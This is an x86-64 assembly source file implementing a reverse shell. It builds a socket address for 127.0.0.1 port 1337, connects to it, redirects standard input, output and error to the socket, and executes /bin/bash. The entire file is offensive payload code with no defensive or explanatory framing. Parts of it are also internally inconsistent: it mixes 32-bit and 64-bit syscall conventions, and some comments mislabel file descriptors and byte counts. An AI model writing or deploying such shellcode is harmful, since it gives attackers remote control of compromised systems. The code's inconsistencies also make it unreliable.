section .data
    struc sockaddr
        sin_family  resb 2
        sin_port    resb 2
        sin_addr    resb 4
        sin_padding resb 8
    endstruc

    addr istruc sockaddr
        at sin_family ,  dw 2
        at sin_port ,    db 0x05, 0x39
        at sin_addr ,    db 127, 0, 0, 1
        at sin_padding , db 0,0,0,0,0,0,0,0
    iend

section .text
global _start

_start:
    mov rax, `h\0\0\0\0\0\0\0`
    push rax
    mov rax, `/bin/bas`
    push rax

    mov rax, 1
    mov rdi, 1 ; stdout
    mov rsi, rsp
    mov rdx, 10 ; 4 bytes string.
    syscall

    mov r14, rsp

_socket:
    mov rbx, 2 ; AF_INET
    mov rcx, 1 ; SOCK_STREAM
    mov rdx, 6 ; IPPROTO_TCP
    mov rax, 359; sys_socket
    int 0x80 ; syscall
    cmp rax,-1
    jz _exit
    mov r13, rax ; save file descriptor

_connect:
    mov rax, 362
    mov rbx, r13
    mov rcx, addr
    mov rdx, 0x10
    ; call connect
    int 0x80

    mov rax, 63 ; dup2
    mov rbx, r13
    mov rcx, 0 ; stdou
    int 0x80

    mov rax, 63 ; dup2
    mov rbx, r13
    mov rcx, 1 ; stdin
    int 0x80

    mov rax, 63 ; dup2
    mov rbx, r13
    mov rcx, 2 ; stderr
    int 0x80

    mov rax, 59 ; execve
    mov rdi, r14
    mov rsi, 0
    mov rdx, 0
    syscall

_exit:
    mov rax, 1
    mov rbx, 0
    int 0x80